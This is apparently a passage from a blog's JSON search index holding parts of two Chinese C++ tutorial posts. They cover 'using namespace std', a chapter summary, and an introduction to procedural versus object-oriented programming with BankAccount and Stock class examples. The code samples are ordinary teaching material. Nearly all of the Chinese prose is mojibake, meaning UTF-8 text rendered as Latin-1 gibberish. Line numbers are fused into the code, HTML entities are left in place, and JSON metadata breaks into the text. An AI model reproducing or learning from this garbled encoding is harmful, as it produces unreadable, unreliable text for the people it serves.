åœ¨æ‰€æœ‰å‡½æ•°å®šä¹‰ä¹‹å‰ï¼ˆé€šå¸¸æ˜¯åœ¨æ‰€æœ‰ #include ä¹‹åï¼‰æ”¾ç½®ä¸€ä¸ª using namespace std; æŒ‡ä»¤: è¿™ä½¿å¾—æ–‡ä»¶ä¸­çš„æ‰€æœ‰åç»­ä»£ç éƒ½å¯ä»¥ç›´æ¥ä½¿ç”¨ std ä¸­çš„åç§°ï¼Œæ— éœ€ std:: å‰ç¼€ã€‚è¿™ç§æ–¹å¼æœ€ç®€å•ï¼Œä½†åœ¨å¤§å‹é¡¹ç›®ä¸­æˆ–ç¼–å†™å¤´æ–‡ä»¶æ—¶ä¸æ¨èï¼Œå› ä¸ºå®ƒå¯èƒ½å¼•å…¥å…¨å±€å‘½åå†²çªã€‚ å¯¹äºå­¦ä¹ å’Œå°å‹é¡¹ç›®ï¼Œè¿™é€šå¸¸æ˜¯å¯æ¥å—çš„ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹ (å…¨å±€ using æŒ‡ä»¤): 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;cmath&gt;// å°† using æŒ‡ä»¤æ”¾åœ¨æ‰€æœ‰å‡½æ•°ä¹‹å¤–using namespace std; // å‡½æ•°åŸå‹void print_sqrt(double val);double get_input();int main() &#123; double number = get_input(); // ç›´æ¥ä½¿ç”¨ get_input print_sqrt(number); // ç›´æ¥ä½¿ç”¨ print_sqrt cout &lt;&lt; &quot;Program finished.&quot; &lt;&lt; endl; // ç›´æ¥ä½¿ç”¨ cout å’Œ endl return 0;&#125;// å‡½æ•°å®šä¹‰void print_sqrt(double val) &#123; if (val &lt; 0) &#123; cout &lt;&lt; &quot;Cannot calculate square root of a negative number.&quot; &lt;&lt; endl; &#125; else &#123; double root = sqrt(val); // ç›´æ¥ä½¿ç”¨ sqrt (æ¥è‡ª cmath, å·²åœ¨ std ä¸­) cout &lt;&lt; &quot;The square root of &quot; &lt;&lt; val &lt;&lt; &quot; is &quot; &lt;&lt; root &lt;&lt; endl; &#125;&#125;double get_input() &#123; double input_val; cout &lt;&lt; &quot;Enter a number: &quot;; // ç›´æ¥ä½¿ç”¨ cout cin &gt;&gt; input_val; // ç›´æ¥ä½¿ç”¨ cin return input_val;&#125; é€‰æ‹©å“ªç§æ–¹å¼å–å†³äºé¡¹ç›®çš„è§„æ¨¡å’Œä¸ªäºº/å›¢é˜Ÿçš„ç¼–ç è§„èŒƒã€‚å¯¹äºåˆå­¦è€…ç¼–å†™çš„ç®€å•å¤šå‡½æ•°ç¨‹åºï¼Œå°† using namespace std; æ”¾åœ¨ #include ä¹‹åæ˜¯ä¸€ç§å¸¸è§çš„ç®€åŒ–æ–¹æ³•ã€‚ 2.5 æ€»ç»“æœ¬ç« å¼•å¯¼æˆ‘ä»¬è¿ˆå‡ºäº†å­¦ä¹ C++çš„ç¬¬ä¸€æ­¥ï¼Œæ¶µç›–äº†ç¼–å†™ã€ç¼–è¯‘å’Œç†è§£ä¸€ä¸ªåŸºæœ¬C++ç¨‹åºæ‰€éœ€çš„ foundational conceptsã€‚ æˆ‘ä»¬ä»C++ç¨‹åºçš„æ ¸å¿ƒâ€”â€”main()å‡½æ•°å¼€å§‹ï¼Œå®ƒæ˜¯ç¨‹åºçš„å…¥å£ç‚¹ã€‚äº†è§£äº†å¦‚ä½•ä½¿ç”¨æ³¨é‡Šï¼ˆ// å’Œ /* */ï¼‰æ¥æé«˜ä»£ç çš„å¯è¯»æ€§ã€‚æ¥ç€ï¼Œæˆ‘ä»¬æ¥è§¦äº†C++é¢„å¤„ç†å™¨ï¼Œç‰¹åˆ«æ˜¯ #include æŒ‡ä»¤ï¼Œå®ƒç”¨äºåŒ…å«å¤´æ–‡ä»¶ï¼ˆå¦‚ &lt;iostream&gt;ï¼‰ï¼Œè¿™äº›å¤´æ–‡ä»¶æä¾›äº†å‡½æ•°å’Œå¯¹è±¡çš„å£°æ˜ã€‚æˆ‘ä»¬åŒºåˆ†äº†æ ‡å‡†åº“å¤´æ–‡ä»¶ï¼ˆç”¨ &lt;&gt;ï¼‰å’Œç”¨æˆ·è‡ªå®šä¹‰å¤´æ–‡ä»¶ï¼ˆç”¨ &quot;&quot;ï¼‰ã€‚ åç§°ç©ºé—´çš„æ¦‚å¿µè¢«å¼•å…¥ï¼Œç‰¹åˆ«æ˜¯ std åç§°ç©ºé—´ï¼Œå®ƒåŒ…å«äº†C++æ ‡å‡†åº“çš„å¤§éƒ¨åˆ†å†…å®¹ã€‚æˆ‘ä»¬å­¦ä¹ äº†è®¿é—® std ä¸­å…ƒç´ çš„ä¸‰ç§æ–¹å¼ï¼šä½¿ç”¨ std:: å‰ç¼€ã€using å£°æ˜å’Œ using ç¼–è¯‘æŒ‡ä»¤ï¼Œå¹¶è®¨è®ºäº†å®ƒä»¬çš„é€‚ç”¨åœºæ™¯å’Œæ½œåœ¨é£é™©ã€‚ æˆ‘ä»¬é‡ç‚¹å­¦ä¹ äº†å¦‚ä½•ä½¿ç”¨ iostream åº“ä¸­çš„ cout å¯¹è±¡å’Œæ’å…¥è¿ç®—ç¬¦ &lt;&lt; æ¥æ˜¾ç¤ºå„ç§ç±»å‹çš„æ•°æ®ï¼ˆå­—ç¬¦ä¸²ã€æ•´æ•°ã€æµ®ç‚¹æ•°ç­‰ï¼‰ï¼Œä»¥åŠå¦‚ä½•ä½¿ç”¨ endl æˆ– \\n è¿›è¡Œæ¢è¡Œã€‚ä»£ç æ ¼å¼åŒ–çš„é‡è¦æ€§ä¹Ÿè¢«å¼ºè°ƒï¼Œä»¥ä¿è¯ä»£ç æ¸…æ™°ã€æ˜“äºç»´æŠ¤ã€‚ éšåï¼Œæˆ‘ä»¬å­¦ä¹ äº†C++çš„åŸºæœ¬è¯­å¥ç±»å‹ã€‚å£°æ˜è¯­å¥ç”¨äºåˆ›å»ºå˜é‡ï¼ŒæŒ‡å®šå…¶ç±»å‹å’Œåç§°ï¼Œå¹¶å¯ä»¥é€‰æ‹©åœ¨å£°æ˜æ—¶è¿›è¡Œåˆå§‹åŒ–ã€‚èµ‹å€¼è¯­å¥ä½¿ç”¨ = è¿ç®—ç¬¦å°†å€¼å­˜å‚¨åˆ°å˜é‡ä¸­ã€‚æˆ‘ä»¬è¿˜çœ‹åˆ°äº† cout å¦‚ä½•æ™ºèƒ½åœ°å¤„ç†ä¸åŒæ•°æ®ç±»å‹ï¼Œä»¥åŠå¦‚ä½•é€šè¿‡é“¾å¼è°ƒç”¨ &lt;&lt; æ¥æ‹¼æ¥è¾“å‡ºã€‚ è¾“å…¥æ“ä½œé€šè¿‡ cin å¯¹è±¡å’Œæå–è¿ç®—ç¬¦ &gt;&gt; å®ç°ï¼Œå…è®¸ç¨‹åºä»ç”¨æˆ·é‚£é‡Œè¯»å–æ•°æ®å¹¶å­˜å‚¨åˆ°å˜é‡ä¸­ã€‚ æœ€åï¼Œæˆ‘ä»¬åˆæ­¥æ¢è®¨äº†å‡½æ•°ã€‚æˆ‘ä»¬å­¦ä¹ äº†å¦‚ä½•è°ƒç”¨åº“å‡½æ•°ï¼ˆå¦‚ &lt;cmath&gt; ä¸­çš„ sqrt()ï¼‰å¹¶ä½¿ç”¨å®ƒä»¬çš„è¿”å›å€¼ã€‚æˆ‘ä»¬äº†è§£äº†å‡½æ•°çš„ä¸åŒå˜ä½“ï¼ˆæœ‰/æ— å‚æ•°ï¼Œæœ‰/æ— è¿”å›å€¼ï¼‰ã€‚æ›´é‡è¦çš„æ˜¯ï¼Œæˆ‘ä»¬å­¦ä¹ äº†å¦‚ä½•å®šä¹‰è‡ªå·±çš„å‡½æ•°ï¼ŒåŒ…æ‹¬ç¼–å†™å‡½æ•°åŸå‹ï¼ˆå£°æ˜ï¼‰å’Œå‡½æ•°å®šä¹‰ï¼ˆå®ç°ï¼‰ï¼Œä»¥åŠå¦‚ä½•é€šè¿‡å‡½æ•°è°ƒç”¨æ¥æ‰§è¡Œå®ƒä»¬ã€‚æˆ‘ä»¬è¿˜è®¨è®ºäº†å¦‚ä½•åœ¨åŒ…å«å¤šä¸ªå‡½æ•°çš„ç¨‹åºä¸­ç®¡ç† std åç§°ç©ºé—´çš„ä½¿ç”¨ã€‚ é€šè¿‡æœ¬ç« çš„å­¦ä¹ ï¼Œæˆ‘ä»¬å·²ç»èƒ½å¤Ÿç¼–å†™ç®€å•çš„C++ç¨‹åºï¼Œå®ç°åŸºæœ¬çš„è¾“å…¥ã€å¤„ç†å’Œè¾“å‡ºåŠŸèƒ½ï¼Œå¹¶å¯¹C++ç¨‹åºçš„ç»“æ„å’Œä¸€äº›æ ¸å¿ƒæ¦‚å¿µæœ‰äº†åˆæ­¥çš„è®¤è¯†ã€‚","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 10 å¯¹è±¡å’Œç±»","slug":"Cpp_tutorial_Chapter_10","date":"2025-04-26T12:03:35.399Z","updated":"2025-04-26T12:02:31.684Z","comments":true,"path":"2025/04/26/Cpp_tutorial_Chapter_10/","link":"","permalink":"http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_10/","excerpt":"","text":"10.1 è¿‡ç¨‹æ€§ç¼–ç¨‹å’Œé¢å‘å¯¹è±¡ç¼–ç¨‹åœ¨æ·±å…¥å­¦ä¹ C++çš„ç±»ä¹‹å‰ï¼Œäº†è§£ä¸¤ç§ä¸»è¦çš„ç¼–ç¨‹èŒƒå¼ï¼ˆProgramming Paradigmsï¼‰â€”â€”è¿‡ç¨‹æ€§ç¼–ç¨‹å’Œé¢å‘å¯¹è±¡ç¼–ç¨‹â€”â€”ä¹‹é—´çš„åŒºåˆ«æ˜¯å¾ˆæœ‰å¸®åŠ©çš„ã€‚C++ è¯­è¨€åŒæ—¶æ”¯æŒè¿™ä¸¤ç§èŒƒå¼ï¼Œä½†å…¶å¼ºå¤§çš„é¢å‘å¯¹è±¡ç‰¹æ€§æ˜¯å…¶æ ¸å¿ƒä¼˜åŠ¿ä¹‹ä¸€ã€‚ è¿‡ç¨‹æ€§ç¼–ç¨‹ (Procedural Programming)è¿‡ç¨‹æ€§ç¼–ç¨‹æ˜¯æœ€æ—©æœŸçš„ç¼–ç¨‹èŒƒå¼ä¹‹ä¸€ï¼ŒåƒCè¯­è¨€å°±æ˜¯å…¸å‹çš„è¿‡ç¨‹æ€§è¯­è¨€ã€‚å®ƒçš„æ ¸å¿ƒæ€æƒ³æ˜¯å°†ç¨‹åºçœ‹ä½œæ˜¯ä¸€ç³»åˆ—è¦æ‰§è¡Œçš„è¿‡ç¨‹æˆ–å‡½æ•°ã€‚ å…³æ³¨ç‚¹ï¼š ä¸»è¦å…³æ³¨ç‚¹åœ¨äºç®—æ³•å’Œæ‰§è¡Œæ­¥éª¤ã€‚ç¨‹åºè¢«åˆ†è§£ä¸ºä¸€ç³»åˆ—çš„å‡½æ•°è°ƒç”¨ã€‚ æ•°æ®å¤„ç†ï¼š æ•°æ®é€šå¸¸æ˜¯ç‹¬ç«‹äºå‡½æ•°å­˜åœ¨çš„ï¼ˆä¾‹å¦‚å…¨å±€å˜é‡ï¼‰ï¼Œæˆ–è€…ä½œä¸ºå‚æ•°åœ¨å‡½æ•°ä¹‹é—´ä¼ é€’ã€‚æ•°æ®å’Œæ“ä½œæ•°æ®çš„å‡½æ•°æ˜¯åˆ†ç¦»çš„ã€‚ ç»„ç»‡æ–¹å¼ï¼š ç¨‹åºé€šè¿‡å‡½æ•°çš„å±‚æ¬¡ç»“æ„æ¥ç»„ç»‡ã€‚ä¸€ä¸ªä¸»å‡½æ•°è°ƒç”¨å…¶ä»–å‡½æ•°ï¼Œè¿™äº›å‡½æ•°åˆå¯èƒ½è°ƒç”¨æ›´åº•å±‚çš„å‡½æ•°ã€‚ ç¤ºä¾‹è¯­è¨€ï¼š C, Pascal, Fortranã€‚ è¿‡ç¨‹æ€§ç¼–ç¨‹çš„æ€ç»´æ–¹å¼ï¼š â€œç¨‹åºéœ€è¦æ‰§è¡Œå“ªäº›æ­¥éª¤ï¼Ÿéœ€è¦å“ªäº›å‡½æ•°æ¥å®ç°è¿™äº›æ­¥éª¤ï¼Ÿâ€ ä¾‹å­ï¼ˆæ¦‚å¿µæ€§ï¼‰ï¼šå‡è®¾è¦ç®¡ç†ä¸€ä¸ªé“¶è¡Œè´¦æˆ·ã€‚åœ¨è¿‡ç¨‹æ€§æ–¹æ³•ä¸­ï¼Œä½ å¯èƒ½ä¼šæœ‰ï¼š ä¸€ä¸ªæ•°æ®ç»“æ„ï¼ˆæ¯”å¦‚ structï¼‰æ¥å­˜å‚¨è´¦æˆ·ä¿¡æ¯ï¼ˆè´¦å·ã€ä½™é¢ï¼‰ã€‚ ä¸€ç³»åˆ—å‡½æ•°æ¥æ“ä½œè¿™ä¸ªæ•°æ®ç»“æ„ï¼šdeposit(account, amount), withdraw(account, amount), check_balance(account)ã€‚ 12345678910111213141516171819202122232425262728293031// C è¯­è¨€ç¤ºä¾‹ (è¿‡ç¨‹æ€§)struct BankAccount &#123; int accountNumber; double balance;&#125;;void deposit(struct BankAccount* acc, double amount) &#123; if (amount &gt; 0) &#123; acc-&gt;balance += amount; &#125;&#125;void withdraw(struct BankAccount* acc, double amount) &#123; if (amount &gt; 0 &amp;&amp; acc-&gt;balance &gt;= amount) &#123; acc-&gt;balance -= amount; &#125; else &#123; // å¤„ç†é”™è¯¯ &#125;&#125;double check_balance(struct BankAccount* acc) &#123; return acc-&gt;balance;&#125;int main() &#123; struct BankAccount myAccount = &#123;12345, 1000.0&#125;; deposit(&amp;myAccount, 500.0); withdraw(&amp;myAccount, 200.0); // ... return 0;&#125; åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œæ•°æ®ï¼ˆmyAccountï¼‰å’Œæ“ä½œï¼ˆdeposit, withdrawï¼‰æ˜¯åˆ†å¼€å®šä¹‰çš„ã€‚ é¢å‘å¯¹è±¡ç¼–ç¨‹ (Object-Oriented Programming - OOP)é¢å‘å¯¹è±¡ç¼–ç¨‹ï¼ˆOOPï¼‰æ˜¯ä¸€ç§ä¸åŒçš„æ€è€ƒæ–¹å¼ã€‚å®ƒå°†ç¨‹åºçœ‹ä½œæ˜¯ç”±ç›¸äº’äº¤äº’çš„å¯¹è±¡ (Objects) ç»„æˆçš„ã€‚ å…³æ³¨ç‚¹ï¼š ä¸»è¦å…³æ³¨ç‚¹åœ¨äºæ•°æ®ä»¥åŠä¸æ•°æ®ç›¸å…³çš„æ“ä½œã€‚ç¨‹åºçš„æ ¸å¿ƒæ˜¯å¯¹è±¡ã€‚ å¯¹è±¡ï¼š å¯¹è±¡æ˜¯ç°å®ä¸–ç•Œå®ä½“çš„æŠ½è±¡ï¼Œå®ƒå°è£… (Encapsulates) äº†æ•°æ®ï¼ˆå±æ€§/çŠ¶æ€ï¼‰å’Œå¯ä»¥å¯¹è¿™äº›æ•°æ®æ‰§è¡Œçš„æ“ä½œï¼ˆæ–¹æ³•/è¡Œä¸ºï¼‰ã€‚ ç»„ç»‡æ–¹å¼ï¼š ç¨‹åºé€šè¿‡åˆ›å»ºå¯¹è±¡å¹¶è®©è¿™äº›å¯¹è±¡ç›¸äº’å‘é€æ¶ˆæ¯ï¼ˆè°ƒç”¨æ–¹æ³•ï¼‰æ¥ç»„ç»‡ã€‚ æ ¸å¿ƒæ¦‚å¿µï¼š å°è£… (Encapsulation): å°†æ•°æ®å’Œæ“ä½œæ•°æ®çš„å‡½æ•°æ†ç»‘åœ¨ä¸€èµ·ï¼ˆå½¢æˆç±»ï¼‰ï¼Œå¹¶å¯¹å¤–éƒ¨éšè—å¯¹è±¡çš„å†…éƒ¨å®ç°ç»†èŠ‚ï¼ˆæ•°æ®éšè—ï¼‰ã€‚ ç»§æ‰¿ (Inheritance): å…è®¸åˆ›å»ºä¸€ä¸ªæ–°ç±»ï¼ˆæ´¾ç”Ÿç±»ï¼‰ï¼Œè¯¥ç±»ç»§æ‰¿ç°æœ‰ç±»ï¼ˆåŸºç±»ï¼‰çš„å±æ€§å’Œæ–¹æ³•ï¼Œä»è€Œå®ç°ä»£ç é‡ç”¨å’Œå±‚æ¬¡ç»“æ„ã€‚ å¤šæ€ (Polymorphism): å…è®¸ä¸åŒç±»çš„å¯¹è±¡å¯¹ç›¸åŒçš„æ¶ˆæ¯ï¼ˆæ–¹æ³•è°ƒç”¨ï¼‰åšå‡ºä¸åŒçš„å“åº”ã€‚è¿™é€šå¸¸é€šè¿‡è™šå‡½æ•°å®ç°ã€‚ æŠ½è±¡ (Abstraction): å…³æ³¨å¯¹è±¡çš„æœ¬è´¨ç‰¹å¾ï¼Œå¿½ç•¥ä¸é‡è¦çš„ç»†èŠ‚ã€‚ç±»å°±æ˜¯ä¸€ç§æŠ½è±¡ã€‚ ç¤ºä¾‹è¯­è¨€ï¼š C++, Java, C#, Python, Smalltalkã€‚ é¢å‘å¯¹è±¡ç¼–ç¨‹çš„æ€ç»´æ–¹å¼ï¼š â€œç¨‹åºæ¶‰åŠå“ªäº›â€˜äº‹ç‰©â€™ï¼ˆå¯¹è±¡ï¼‰ï¼Ÿæ¯ä¸ªâ€˜äº‹ç‰©â€™æœ‰å“ªäº›ç‰¹å¾ï¼ˆæ•°æ®ï¼‰ï¼Ÿå®ƒå¯ä»¥åšä»€ä¹ˆï¼ˆæ–¹æ³•ï¼‰ï¼Ÿè¿™äº›â€˜äº‹ç‰©â€™ä¹‹é—´å¦‚ä½•äº¤äº’ï¼Ÿâ€ ä¾‹å­ï¼ˆæ¦‚å¿µæ€§ï¼‰ï¼šå¯¹äºé“¶è¡Œè´¦æˆ·ï¼ŒOOPæ–¹æ³•ä¼šåˆ›å»ºä¸€ä¸ª BankAccount ç±»ï¼š æ•°æ®æˆå‘˜ï¼ˆå±æ€§ï¼‰ï¼š accountNumber, balance (é€šå¸¸è®¾ä¸ºç§æœ‰ privateï¼Œä»¥å®ç°æ•°æ®éšè—)ã€‚ æˆå‘˜å‡½æ•°ï¼ˆæ–¹æ³•ï¼‰ï¼š deposit(amount), withdraw(amount), check_balance() (è¿™äº›å‡½æ•°ç›´æ¥æ“ä½œå¯¹è±¡å†…éƒ¨çš„æ•°æ®)ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647// C++ ç¤ºä¾‹ (é¢å‘å¯¹è±¡)class BankAccount &#123;private: // æ•°æ®éšè— int accountNumber; double balance;public: // å…¬å…±æ¥å£ // æ„é€ å‡½æ•° (ç”¨äºåˆ›å»ºå¯¹è±¡) BankAccount(int accNum, double initialBalance) &#123; accountNumber = accNum; balance = (initialBalance &gt;= 0) ? initialBalance : 0.0; &#125; void deposit(double amount) &#123; if (amount &gt; 0) &#123; balance += amount; &#125; &#125; void withdraw(double amount) &#123; if (amount &gt; 0 &amp;&amp; balance &gt;= amount) &#123; balance -= amount; &#125; else &#123; // å¤„ç†é”™è¯¯ &#125; &#125; double check_balance() const &#123; // const è¡¨ç¤ºæ­¤æ–¹æ³•ä¸ä¿®æ”¹å¯¹è±¡çŠ¶æ€ return balance; &#125; int getAccountNumber() const &#123; return accountNumber; &#125;&#125;; // æ³¨æ„ç±»å®šä¹‰æœ«å°¾çš„åˆ†å·int main() &#123; // åˆ›å»º BankAccount å¯¹è±¡ BankAccount myAccount(12345, 1000.0); // é€šè¿‡å¯¹è±¡è°ƒç”¨æ–¹æ³• myAccount.deposit(500.0); myAccount.withdraw(200.0); std::cout &lt;&lt; &quot;Balance: &quot; &lt;&lt; myAccount.check_balance() &lt;&lt; std::endl; return 0;&#125; åœ¨è¿™é‡Œï¼Œæ•°æ® (accountNumber, balance) å’Œæ“ä½œ (deposit, withdraw, check_balance) è¢«ç´§å¯†åœ°æ†ç»‘åœ¨ BankAccount ç±»ä¸­ã€‚ä½ é€šè¿‡ myAccount è¿™ä¸ªå¯¹è±¡æ¥è°ƒç”¨å®ƒçš„æ–¹æ³•ã€‚ æ€»ç»“å¯¹æ¯” ç‰¹æ€§ è¿‡ç¨‹æ€§ç¼–ç¨‹ é¢å‘å¯¹è±¡ç¼–ç¨‹ (OOP) æ ¸å¿ƒ å‡½æ•°/è¿‡ç¨‹ å¯¹è±¡ (æ•°æ® + æ–¹æ³•) æ•°æ® é€šå¸¸ä¸å‡½æ•°åˆ†ç¦» å°è£…åœ¨å¯¹è±¡å†…éƒ¨ è®¿é—®æ§åˆ¶ æœ‰é™ (ä¸»è¦é ä½œç”¨åŸŸ) å¼º (public, private, protected) ä¸»è¦ä¼˜åŠ¿ ç®€å•ç›´æ¥ï¼Œé€‚åˆå°å‹æˆ–ä¸­å‹é¡¹ç›® æ¨¡å—åŒ–ã€é‡ç”¨æ€§ã€å¯ç»´æŠ¤æ€§ã€æ‰©å±•æ€§å¥½ è®¾è®¡æ–¹æ³• è‡ªé¡¶å‘ä¸‹ (Top-down) è‡ªåº•å‘ä¸Š (Bottom-up) æˆ–æ··åˆ ä»£ç é‡ç”¨ ä¸»è¦é€šè¿‡å‡½æ•°åº“ ä¸»è¦é€šè¿‡ç»§æ‰¿å’Œç»„åˆ é€‚åˆåœºæ™¯ ç®—æ³•å¯†é›†å‹ã€é¡ºåºæ‰§è¡Œä»»åŠ¡ å¤§å‹å¤æ‚ç³»ç»Ÿã€æ¨¡æ‹Ÿã€GUI C++ æœ€åˆæ˜¯ä» C è¯­è¨€å‘å±•è€Œæ¥çš„ï¼Œå› æ­¤å®ƒå®Œå…¨å…¼å®¹è¿‡ç¨‹æ€§ç¼–ç¨‹ã€‚ç„¶è€Œï¼ŒC++ çš„çœŸæ­£å¨åŠ›åœ¨äºå…¶å¼ºå¤§çš„é¢å‘å¯¹è±¡ç‰¹æ€§ï¼Œå®ƒå…è®¸å¼€å‘è€…æ„å»ºæ›´å¤§å‹ã€æ›´å¤æ‚ã€æ›´æ˜“äºç»´æŠ¤å’Œæ‰©å±•çš„è½¯ä»¶ç³»ç»Ÿã€‚æ¥ä¸‹æ¥çš„ç« èŠ‚å°†æ·±å…¥æ¢è®¨ OOP çš„æ ¸å¿ƒâ€”â€”ç±»å’Œå¯¹è±¡ã€‚ 10.2 æŠ½è±¡å’Œç±»é¢å‘å¯¹è±¡ç¼–ç¨‹ï¼ˆOOPï¼‰çš„æ ¸å¿ƒæ€æƒ³ä¹‹ä¸€æ˜¯**æŠ½è±¡ (Abstraction)**ã€‚åœ¨ç¼–ç¨‹ä¸­ï¼ŒæŠ½è±¡æ„å‘³ç€å…³æ³¨äº‹ç‰©çš„æœ¬è´¨ç‰¹å¾å’Œè¡Œä¸ºï¼Œè€Œå¿½ç•¥å…¶ä¸é‡è¦çš„å†…éƒ¨ç»†èŠ‚ã€‚æˆ‘ä»¬æ¯å¤©éƒ½åœ¨ä½¿ç”¨æŠ½è±¡ï¼šå½“ä½ å¼€è½¦æ—¶ï¼Œä½ åªéœ€è¦çŸ¥é“å¦‚ä½•ä½¿ç”¨æ–¹å‘ç›˜ã€æ²¹é—¨å’Œåˆ¹è½¦ï¼ˆæ¥å£ï¼‰ï¼Œè€Œä¸éœ€è¦äº†è§£å¼•æ“å†…éƒ¨å¤æ‚çš„æœºæ¢°åŸç†ï¼ˆå®ç°ç»†èŠ‚ï¼‰ã€‚ 10.2.1 ç±»å‹æ˜¯ä»€ä¹ˆåœ¨ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œâ€œç±»å‹â€ï¼ˆTypeï¼‰å®šä¹‰äº†ä¸€ç»„å¯èƒ½çš„å€¼ä»¥åŠå¯ä»¥å¯¹è¿™äº›å€¼æ‰§è¡Œçš„æ“ä½œã€‚ å†…ç½®ç±»å‹ (Built-in Types): C++ æä¾›äº†åƒ int, float, char, bool è¿™æ ·çš„åŸºæœ¬ç±»å‹ã€‚æˆ‘ä»¬çŸ¥é“ int å¯ä»¥å­˜å‚¨æ•´æ•°ï¼Œå¹¶ä¸”å¯ä»¥å¯¹å®ƒä»¬æ‰§è¡ŒåŠ ã€å‡ã€ä¹˜ã€é™¤ç­‰è¿ç®—ã€‚ç¼–è¯‘å™¨çŸ¥é“å¦‚ä½•è¡¨ç¤ºè¿™äº›ç±»å‹çš„æ•°æ®ä»¥åŠå¦‚ä½•æ‰§è¡Œè¿™äº›æ“ä½œã€‚ ç”¨æˆ·å®šä¹‰ç±»å‹ (User-Defined Types - UDT): C++ å…è®¸ç¨‹åºå‘˜åˆ›å»ºè‡ªå·±çš„ç±»å‹æ¥æ¨¡æ‹Ÿç°å®ä¸–ç•Œæˆ–ç‰¹å®šé—®é¢˜åŸŸä¸­çš„æ¦‚å¿µã€‚è¿™å°±æ˜¯ç±» (Class) å‘æŒ¥ä½œç”¨çš„åœ°æ–¹ã€‚ç±»æ˜¯ä¸€ç§å°†æ•°æ®ï¼ˆå±æ€§ï¼‰å’Œæ“ä½œè¿™äº›æ•°æ®çš„å‡½æ•°ï¼ˆæ–¹æ³•ï¼‰æ†ç»‘åœ¨ä¸€èµ·çš„æœºåˆ¶ï¼Œä»è€Œåˆ›å»ºæ–°çš„æ•°æ®ç±»å‹ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœä½ åœ¨ç¼–å†™ä¸€ä¸ªè‚¡ç¥¨äº¤æ˜“ç¨‹åºï¼Œä½ å¯èƒ½éœ€è¦ä¸€ä¸ªè¡¨ç¤ºâ€œè‚¡ç¥¨â€çš„ç±»å‹ã€‚è¿™ä¸ªç±»å‹åº”è¯¥åŒ…å«å“ªäº›æ•°æ®ï¼ˆå¦‚è‚¡ç¥¨åç§°ã€æŒæœ‰æ•°é‡ã€å•ä»·ï¼‰ï¼Ÿå¯ä»¥å¯¹å®ƒæ‰§è¡Œå“ªäº›æ“ä½œï¼ˆå¦‚è´­ä¹°ã€å‡ºå”®ã€æ›´æ–°ä»·æ ¼ã€æ˜¾ç¤ºä¿¡æ¯ï¼‰ï¼Ÿç±»å…è®¸ä½ ç²¾ç¡®åœ°å®šä¹‰è¿™äº›ã€‚ 10.2.2 C++ä¸­çš„ç±»ç±»æ˜¯åˆ›å»ºå¯¹è±¡çš„è“å›¾æˆ–æ¨¡æ¿ã€‚å®ƒå®šä¹‰äº†ï¼š æ•°æ®æˆå‘˜ (Data Members): å¯¹è±¡å°†å­˜å‚¨çš„æ•°æ®ï¼ˆä¹Ÿç§°ä¸ºå±æ€§ã€çŠ¶æ€ï¼‰ã€‚ æˆå‘˜å‡½æ•° (Member Functions): å¯ä»¥å¯¹å¯¹è±¡çš„æ•°æ®æ‰§è¡Œçš„æ“ä½œï¼ˆä¹Ÿç§°ä¸ºæ–¹æ³•ã€è¡Œä¸ºï¼‰ã€‚ ç±»å£°æ˜çš„åŸºæœ¬è¯­æ³•: 123456789101112class ClassName &#123;private: // ç§æœ‰æ•°æ®æˆå‘˜å’Œæˆå‘˜å‡½æ•° // é€šå¸¸å°†æ•°æ®æˆå‘˜æ”¾åœ¨è¿™é‡Œï¼Œå®ç°æ•°æ®éšè—public: // å…¬æœ‰æ•°æ®æˆå‘˜å’Œæˆå‘˜å‡½æ•° // è¿™æ˜¯ç±»çš„å…¬å…±æ¥å£ï¼Œå¤–éƒ¨ä»£ç é€šè¿‡å®ƒä»¬ä¸å¯¹è±¡äº¤äº’protected: // ä¿æŠ¤æˆå‘˜ (å°†åœ¨ç»§æ‰¿ä¸­è®¨è®º)&#125;; // æ³¨æ„æœ«å°¾çš„åˆ†å· class å…³é”®å­—: è¡¨æ˜ä½ æ­£åœ¨å®šä¹‰ä¸€ä¸ªç±»ã€‚ ClassName: ä½ ä¸ºæ–°ç±»å‹æŒ‡å®šçš„åç§°ï¼ˆéµå¾ªå˜é‡å‘½åè§„åˆ™ï¼Œé€šå¸¸é¦–å­—æ¯å¤§å†™ï¼‰ã€‚ è®¿é—®è¯´æ˜ç¬¦ (Access Specifiers): private: ç§æœ‰æˆå‘˜åªèƒ½è¢«ç±»çš„å†…éƒ¨æˆå‘˜å‡½æ•°è®¿é—®ã€‚è¿™æ˜¯å®ç°æ•°æ®éšè— (Data Hiding) çš„å…³é”®ï¼Œä¿æŠ¤æ•°æ®ä¸è¢«å¤–éƒ¨ä»£ç éšæ„ä¿®æ”¹ï¼Œæ˜¯å°è£…çš„é‡è¦ä½“ç°ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œç±»æˆå‘˜æ˜¯ private çš„ã€‚ public: å…¬æœ‰æˆå‘˜å¯ä»¥è¢«ç¨‹åºä¸­çš„ä»»ä½•åœ°æ–¹è®¿é—®ï¼ˆé€šè¿‡ç±»çš„å¯¹è±¡ï¼‰ã€‚å®ƒä»¬æ„æˆäº†ç±»çš„**å…¬å…±æ¥å£ (Public Interface)**ã€‚ protected: ä¸ç»§æ‰¿ç›¸å…³ï¼Œç°åœ¨å¯ä»¥æš‚æ—¶å°†å…¶è§†ä¸ºä¸ private ç±»ä¼¼ã€‚ æˆå‘˜: ç±»å®šä¹‰çš„èŠ±æ‹¬å· &#123;&#125; å†…éƒ¨å£°æ˜çš„å˜é‡ï¼ˆæ•°æ®æˆå‘˜ï¼‰å’Œå‡½æ•°ï¼ˆæˆå‘˜å‡½æ•°ï¼‰ã€‚ ç¤ºä¾‹ï¼šå®šä¹‰ä¸€ä¸ªç®€å•çš„ Stock ç±» å‡è®¾æˆ‘ä»¬è¦åˆ›å»ºä¸€ä¸ªè¡¨ç¤ºè‚¡ç¥¨æŒæœ‰çš„ç±»ã€‚ 1234567891011121314151617181920// é€šå¸¸æ”¾åœ¨å¤´æ–‡ä»¶ (e.g., stock.h) ä¸­#include &lt;string&gt; // ä¸ºäº†ä½¿ç”¨ std::stringclass Stock &#123;private: // 